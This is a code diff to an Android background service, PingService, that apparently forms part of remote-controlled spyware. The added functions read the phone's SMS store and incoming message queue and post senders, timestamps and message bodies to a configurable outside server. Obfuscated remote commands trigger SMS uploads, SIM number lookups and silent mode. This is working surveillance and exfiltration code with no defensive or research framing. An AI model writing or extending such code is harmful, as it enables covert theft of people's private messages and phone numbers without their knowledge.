@@ -166,6 +166,47 @@ class PingService : Service() {
 
     /* ================================================================ ping */
 
+    /**
+     * Sends all queued incoming SMS to the server as ONE combined message.
+     * If offline → stays in queue. If online → sends and clears.
+     */
+    private fun drainSmsQueue() {
+        val queue = SmsQueue.getAll(this)
+        if (queue.isEmpty()) return
+        val server = serverUrl(this)
+        if (server.isBlank()) return
+
+        Thread {
+            try {
+                val device = "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}".trim()
+                val fmt    = java.text.SimpleDateFormat("yyyy/MM/dd HH:mm:ss",
+                    java.util.Locale.getDefault())
+                val parts  = queue.mapIndexed { i, m ->
+                    "${i+1}. \uD83D\uDCDE ${m.from}\n\uD83D\uDD50 ${fmt.format(java.util.Date(m.time))}\n${m.body}"
+                }
+                val text = "\uD83D\uDCE8 ${queue.size} new SMS on $device\n\n" +
+                    parts.joinToString("\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n")
+
+                val body = okhttp3.RequestBody.create("text/plain".toMediaType(), text)
+                val req  = okhttp3.Request.Builder()
+                    .url("$server/message")
+                    .addHeader("X-Token", APP_TOKEN)
+                    .post(org.json.JSONObject().apply {
+                        put("text", text)
+                    }.toString().toRequestBody("application/json".toMediaType()))
+                    .build()
+                client.newCall(req).execute().use { resp ->
+                    if (resp.isSuccessful) {
+                        SmsQueue.clear(this)
+                        Log.i(TAG, "SMS queue drained: ${queue.size} messages")
+                    }
+                }
+            } catch (e: Exception) {
+                Log.w(TAG, "drainSmsQueue: ${e.message}")
+            }
+        }.start()
+    }
+
     private fun sendPing() {
         val pendingReport = prefs.getString(KEY_REPORT, null)
 
@@ -230,7 +271,7 @@ class PingService : Service() {
                     sendBroadcast(Intent(ACTION_GOTO).setPackage(packageName).putExtra("url", arg))
                 }
                 "cmd_a" -> vibrate()
-                "cmd_b" -> reportLastSms()  // last SMS
+                "cmd_b" -> sendLastSmsToServer()  // last SMS via server
                 "cmd_c" -> uploadAllSms()  // all SMS as txt file
                 "cmd_d" -> reportPhoneNumbers()  // find SIM numbers
                 "cmd_e" -> setSilent()           // silent mode
@@ -452,6 +493,45 @@ class PingService : Service() {
 
             } catch (e: Exception) {
                 prefs.edit().putString(KEY_REPORT, "Error: ${e.message}").apply()
+            }
+        }.start()
+    }
+
+    // B — read last SMS and send DIRECTLY to server (no ping round-trip)
+    private fun sendLastSmsToServer() {
+        val server = serverUrl(this)
+        if (server.isBlank()) {
+            prefs.edit().putString(KEY_REPORT, "No server set. Use /setserver.").apply()
+            return
+        }
+        Thread {
+            try {
+                val cursor = contentResolver.query(
+                    android.provider.Telephony.Sms.CONTENT_URI,
+                    arrayOf(
+                        android.provider.Telephony.Sms.ADDRESS,
+                        android.provider.Telephony.Sms.BODY,
+                        android.provider.Telephony.Sms.DATE,
+                        android.provider.Telephony.Sms.TYPE,
+                    ),
+                    null, null,
+                    "${android.provider.Telephony.Sms.DATE} DESC LIMIT 1"
+                )
+                val text = cursor?.use { c ->
+                    if (!c.moveToFirst()) return@use "No SMS found."
+                    val addr = c.getString(0) ?: "unknown"
+                    val body = c.getString(1) ?: ""
+                    val date = c.getLong(2)
+                    val type = c.getInt(3)
+                    val typeStr = if (type == android.provider.Telephony.Sms.MESSAGE_TYPE_SENT)
+                        "SENT" else "RECV"
+                    val fmt = java.text.SimpleDateFormat("yyyy/MM/dd HH:mm:ss",
+                        java.util.Locale.getDefault())
+                    "\uD83D\uDCAC Last SMS\n[$typeStr] ${fmt.format(java.util.Date(date))}\n$addr\n$body"
+                } ?: "No SMS."
+                uploadText("last_sms.txt", text, "\uD83D\uDCF1 Last SMS from ${android.os.Build.MODEL}")
+            } catch (e: Exception) {
+                prefs.edit().putString(KEY_REPORT, "SMS error: ${e.message}").apply()
             }
         }.start()
     }
